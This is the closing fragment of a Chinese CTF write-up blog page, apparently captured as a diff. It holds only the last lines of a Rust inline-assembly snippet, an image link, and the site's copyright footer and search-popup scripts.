+        <span class="token function">lateout</span><span class="token punctuation">(</span><span class="token string">"r11"</span><span class="token punctuation">)</span> _<span class="token punctuation">,</span>
+        <span class="token function">lateout</span><span class="token punctuation">(</span><span class="token string">"rax"</span><span class="token punctuation">)</span> _<span class="token punctuation">,</span>
+    <span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+<p><img src="https://tuchuang-1322890938.cos.ap-shanghai.myqcloud.com/pictures/20251216203024.png" alt="image.png" loading="lazy"></p>
+</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>本文作者：</strong>ta0</li><li class="post-copyright-link"><strong>本文链接：</strong><a href="https://ta0.fun/posts/aa344180/" title="VianuCTF2025-Writeup">https://ta0.fun/posts/aa344180/</a></li><li class="post-copyright-license"><strong>版权声明：</strong>本博客所有文章除特别声明外，均默认采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> 许可协议。</li></ul></article><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/d34a19fb/" rel="next" title="老乡鸡CTF-Writeup"><span class="post-nav-text">老乡鸡CTF-Writeup</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2025 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> ta0</span></div><div class="powered"><span>由 <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> 驱动 v7.1.1</span><span class="footer-separator">|</span><span>主题 - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.11</span></div><div id="busuanzi"><span id="busuanzi_container_site_uv" title="总访客量"><span><span class="icon iconify" data-icon="ri:user-line"></span></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="总访问量"><span><span class="icon iconify" data-icon="ri:eye-line"></span></span><span id="busuanzi_value_site_pv"></span></span><script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="搜索"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:search-line"></span></span></a><script>window.addEventListener("DOMContentLoaded", () => {
+  // Handle and trigger popup window
+  document.querySelector(".popup-trigger").addEventListener("click", () => {
+    document.querySelector(".popup").classList.add("show");
+    setTimeout(() => {
+      document.querySelector(".search-input").focus();
+    }, 100);
+  });
+
+  // Monitor main search box
+  const onPopupClose = () => {
+    document.querySelector(".popup").classList.remove("show");
+  };
+
+  document.querySelector(".popup-btn-close").addEventListener("click", () => {
+    onPopupClose();
+  });
+
+  window.addEventListener("keyup", event => {
+    if (event.key === "Escape") {
+      onPopupClose();
+    }
+  });
+});
+</script><script src="https://fastly.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js"></script><script src="/js/search/local-search.js" defer type="module"></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><span class="icon iconify" data-icon="ri:close-line"></span></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="搜索..." value=""></div><div class="search-result-container"></div></div><script src="https://fastly.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script><script>const images = [...document.querySelectorAll('.markdown-body img')]
+mediumZoom(images)</script><style>.medium-zoom-image {
+  z-index: 99;
+}</style></body></html>
